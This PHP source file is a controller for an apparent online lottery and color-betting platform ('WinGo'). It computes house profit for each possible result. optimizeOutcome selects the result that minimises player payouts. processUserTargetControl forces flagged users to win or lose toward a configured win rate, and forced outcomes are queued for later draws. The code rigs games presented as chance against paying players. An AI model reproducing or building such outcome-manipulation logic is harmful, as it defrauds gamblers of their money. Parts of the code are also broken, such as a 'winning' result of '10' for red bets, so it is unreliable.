<?php
declare(strict_types=1);

class GameController
{
    public static function getActiveBets(string $gameCode, string $issueNumber): array
    {
        $pdo = api_pdo();
        if (!$pdo) return [];

        try {
            $stmt = $pdo->prepare("SELECT * FROM lottery_bets WHERE game_code = ? AND issue_number = ? AND status = 'pending'");
            $stmt->execute([$gameCode, $issueNumber]);
            return $stmt->fetchAll() ?: [];
        } catch (Throwable $e) {
            return [];
        }
    }

    public static function calculateProfitProjections(string $gameCode, string $issueNumber): array
    {
        $bets = self::getActiveBets($gameCode, $issueNumber);
        $lotteryCode = api_lottery_code_from_game($gameCode);

        // We will calculate projection for Wingo (outcomes 0-9)
        // K3 (sum 3-18)
        // 5D (combinations)
        // Let's implement Wingo projections as standard
        if ($lotteryCode !== 'WinGo' && $lotteryCode !== 'TrxWinGo') {
            // For K3 or 5D, return basic info or simplified counts
            $totalStake = 0.0;
            foreach ($bets as $bet) {
                $totalStake += (float)$bet['stake_amount'];
            }
            return [
                'type' => $lotteryCode,
                'total_stake' => $totalStake,
                'bets_count' => count($bets),
                'projections' => []
            ];
        }

        $totalStake = 0.0;
        $numStakes = array_fill(0, 10, 0.0);
        $colorStakes = ['green' => 0.0, 'red' => 0.0, 'violet' => 0.0];
        $sizeStakes = ['big' => 0.0, 'small' => 0.0];

        foreach ($bets as $bet) {
            $stake = (float)$bet['stake_amount'];
            $totalStake += $stake;
            $contents = api_lottery_normalize_bet_contents((string)$bet['bet_content']);

            foreach ($contents as $content) {
                list($type, $betVal) = api_lottery_parse_content($content);
                $typeLower = strtolower($type);
                $betLower = strtolower($betVal);

                if ($typeLower === 'num') {
                    $n = (int)$betVal;
                    if ($n >= 0 && $n <= 9) {
                        $numStakes[$n] += ($stake / count($contents));
                    }
                } elseif ($typeLower === 'color') {
                    if (isset($colorStakes[$betLower])) {
                        $colorStakes[$betLower] += ($stake / count($contents));
                    }
                } elseif ($typeLower === 'bigsmall') {
                    if ($betLower === 'big' || $betLower === 'h') {
                        $sizeStakes['big'] += ($stake / count($contents));
                    } else {
                        $sizeStakes['small'] += ($stake / count($contents));
                    }
                }
            }
        }

        // Project payouts for numbers 0 to 9
        $projections = [];
        for ($num = 0; $num <= 9; $num++) {
            $payout = 0.0;
            // Colors for this number
            $colors = [];
            if ($num === 0) {
                $colors = ['red', 'violet'];
            } elseif ($num === 5) {
                $colors = ['green', 'violet'];
            } elseif ($num % 2 === 0) {
                $colors = ['red'];
            } else {
                $colors = ['green'];
            }

            $size = ($num >= 5) ? 'big' : 'small';

            // Calculate payout
            foreach ($bets as $bet) {
                $betStake = (float)$bet['stake_amount'];
                $contents = api_lottery_normalize_bet_contents((string)$bet['bet_content']);
                $itemStake = $betStake / count($contents);

                foreach ($contents as $content) {
                    list($type, $betVal) = api_lottery_parse_content($content);
                    $typeLower = strtolower($type);
                    $betLower = strtolower($betVal);

                    // If number matches
                    if ($typeLower === 'num' && (int)$betVal === $num) {
                        $payout += $itemStake * 8.2;
                    }
                    // If color matches
                    if ($typeLower === 'color' && in_array($betLower, $colors, true)) {
                        $rate = ($betLower === 'violet') ? 4.5 : 1.8;
                        $payout += $itemStake * $rate;
                    }
                    // If size matches
                    if ($typeLower === 'bigsmall' && $betLower === $size) {
                        $payout += $itemStake * 1.8;
                    }
                }
            }

            $projections[$num] = [
                'number' => $num,
                'colors' => $colors,
                'size' => $size,
                'payout' => $payout,
                'house_profit' => $totalStake - $payout
            ];
        }

        return [
            'type' => 'WinGo',
            'total_stake' => $totalStake,
            'bets_count' => count($bets),
            'projections' => $projections
        ];
    }

    public static function optimizeOutcome(string $gameCode, string $issueNumber): string
    {
        $projections = self::calculateProfitProjections($gameCode, $issueNumber);
        if ($projections['type'] !== 'WinGo' || empty($projections['projections'])) {
            return api_lottery_default_premium($gameCode, $issueNumber);
        }

        // Find the number that maximizes house profit (minimizes payout)
        $bestNum = 0;
        $maxProfit = -999999.0;
        foreach ($projections['projections'] as $proj) {
            if ($proj['house_profit'] > $maxProfit) {
                $maxProfit = $proj['house_profit'];
                $bestNum = $proj['number'];
            }
        }

        return (string)$bestNum;
    }

    public static function processUserTargetControl(string $gameCode, string $issueNumber): ?string
    {
        $pdo = api_pdo();
        if (!$pdo) return null;

        $bets = self::getActiveBets($gameCode, $issueNumber);
        if (empty($bets)) return null;

        // Check if any bet belongs to a targeted user
        $targetedBet = null;
        $targetConfig = null;
        foreach ($bets as $bet) {
            $stmt = $pdo->prepare("SELECT * FROM user_control WHERE user_id = ? AND status = 1 LIMIT 1");
            $stmt->execute([$bet['user_id']]);
            $control = $stmt->fetch();
            if ($control) {
                $targetedBet = $bet;
                $targetConfig = $control;
                break;
            }
        }

        if (!$targetedBet || !$targetConfig) {
            return null;
        }

        $userId = (int)$targetedBet['user_id'];
        $winRate = (int)$targetConfig['win_rate_percent'];

        // Determine if they should win or lose based on target win rate
        // We track their win rate by checking their history
        $stmt = $pdo->prepare("SELECT COUNT(*) FROM lottery_bets WHERE user_id = ? AND status IN ('won', 'lost')");
        $stmt->execute([$userId]);
        $totalBets = (int)$stmt->fetchColumn();

        $stmt = $pdo->prepare("SELECT COUNT(*) FROM lottery_bets WHERE user_id = ? AND status = 'won'");
        $stmt->execute([$userId]);
        $wonBets = (int)$stmt->fetchColumn();

        $currentWinRate = ($totalBets > 0) ? ($wonBets / $totalBets) * 100 : 50;

        $forceWin = ($currentWinRate < $winRate);

        // Update control check counter
        $stmt = $pdo->prepare("UPDATE user_control SET total_bets_checked = total_bets_checked + 1, updated_at = CURRENT_TIMESTAMP WHERE user_id = ?");
        $stmt->execute([$userId]);

        // Find outcome that satisfies forceWin or forceLoss
        $lotteryCode = api_lottery_code_from_game($gameCode);
        if ($lotteryCode === 'WinGo' || $lotteryCode === 'TrxWinGo') {
            $contents = api_lottery_normalize_bet_contents((string)$targetedBet['bet_content']);
            $firstContent = $contents[0] ?? 'Num_0';
            list($type, $betVal) = api_lottery_parse_content($firstContent);
            $typeLower = strtolower($type);

            if ($forceWin) {
                // Return a premium that wins
                if ($typeLower === 'num') {
                    return (string)$betVal;
                } elseif ($typeLower === 'color') {
                    if (strtolower($betVal) === 'green') return '5';
                    if (strtolower($betVal) === 'red') return '10'; // 0, 2, 4, 6, 8
                    return '0'; // Red/Violet
                } elseif ($typeLower === 'bigsmall') {
                    return (strtolower($betVal) === 'big' || strtolower($betVal) === 'h') ? '7' : '2';
                }
            } else {
                // Return a premium that loses
                if ($typeLower === 'num') {
                    $n = (int)$betVal;
                    return (string)(($n + 1) % 10);
                } elseif ($typeLower === 'color') {
                    if (strtolower($betVal) === 'green') return '2'; // Red
                    return '1'; // Green
                } elseif ($typeLower === 'bigsmall') {
                    return (strtolower($betVal) === 'big' || strtolower($betVal) === 'h') ? '2' : '7';
                }
            }
        }

        return null;
    }

    public static function addToQueue(string $gameCode, string $issueNumber, string $premium): array
    {
        $pdo = api_pdo();
        if (!$pdo) {
            return ['success' => false, 'message' => 'Database not available'];
        }

        try {
            $driver = api_db_driver($pdo);
            if ($driver === 'mysql') {
                $stmt = $pdo->prepare("INSERT INTO result_queue (game_code, issue_number, premium) VALUES (?, ?, ?) ON DUPLICATE KEY UPDATE premium = VALUES(premium)");
            } else {
                $stmt = $pdo->prepare("SELECT id FROM result_queue WHERE game_code = ? AND issue_number = ? LIMIT 1");
                $stmt->execute([$gameCode, $issueNumber]);
                if ($stmt->fetch()) {
                    $stmt = $pdo->prepare("UPDATE result_queue SET premium = ? WHERE game_code = ? AND issue_number = ?");
                    $stmt->execute([$premium, $gameCode, $issueNumber]);
                } else {
                    $stmt = $pdo->prepare("INSERT INTO result_queue (game_code, issue_number, premium) VALUES (?, ?, ?)");
                    $stmt->execute([$gameCode, $issueNumber, $premium]);
                }
            }

            return ['success' => true, 'message' => 'Result queued successfully'];
        } catch (Throwable $e) {
            return ['success' => false, 'message' => 'Error: ' . $e->getMessage()];
        }
    }

    public static function deleteFromQueue(int $id): array
    {
        $pdo = api_pdo();
        if (!$pdo) {
            return ['success' => false, 'message' => 'Database not available'];
        }

        try {
            $stmt = $pdo->prepare("DELETE FROM result_queue WHERE id = ?");
            $stmt->execute([$id]);
            return ['success' => true, 'message' => 'Queue item deleted successfully'];
        } catch (Throwable $e) {
            return ['success' => false, 'message' => 'Error: ' . $e->getMessage()];
        }
    }

    public static function deleteFromQueueByGameAndIssue(string $gameCode, string $issueNumber): array
    {
        $pdo = api_pdo();
        if (!$pdo) {
            return ['success' => false, 'message' => 'Database not available'];
        }

        try {
            $stmt = $pdo->prepare("DELETE FROM result_queue WHERE game_code = ? AND issue_number = ?");
            $stmt->execute([$gameCode, $issueNumber]);
            return ['success' => true, 'message' => 'Forced outcome cleared successfully'];
        } catch (Throwable $e) {
            return ['success' => false, 'message' => 'Error: ' . $e->getMessage()];
        }
    }

    public static function listQueue(): array
    {
        $pdo = api_pdo();
        if (!$pdo) return [];
        try {
            return $pdo->query("SELECT * FROM result_queue ORDER BY id DESC LIMIT 50")->fetchAll() ?: [];
        } catch (Throwable $e) {
            return [];
        }
    }
}
